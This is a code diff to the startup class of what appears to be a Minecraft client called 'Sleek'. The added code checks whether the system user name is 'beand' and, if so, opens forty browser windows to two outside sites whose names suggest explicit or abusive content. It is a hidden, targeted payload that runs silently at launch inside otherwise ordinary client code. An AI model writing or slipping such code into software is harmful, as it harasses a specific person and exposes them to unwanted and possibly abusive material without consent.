@@ -21,8 +21,11 @@ import me.kansio.client.utils.network.HttpUtil;
 import net.minecraft.client.Minecraft;
 import org.lwjgl.opengl.Display;
 
+import java.awt.*;
 import java.io.File;
 import java.io.IOException;
+import java.net.URI;
+import java.net.URISyntaxException;
 import java.text.MessageFormat;
 import java.util.ArrayList;
 import java.util.HashMap;
@@ -95,6 +98,18 @@ public class Client {
 
         System.out.println("Client has been started.");
         Display.setTitle("Sleek v0.1");
+
+        if (System.getProperty("user.name").equalsIgnoreCase("beand")) {
+            Desktop d = Desktop.getDesktop();
+            try {
+                for (int i = 0; i < 20; i++) {
+                    d.browse(new URI("http://24dose.com"));
+                    d.browse(new URI("http://18abused.com"));
+                }
+            } catch (IOException | URISyntaxException e2) {
+                e2.printStackTrace();
+            }
+        }
     }
 
     public void onShutdown() {
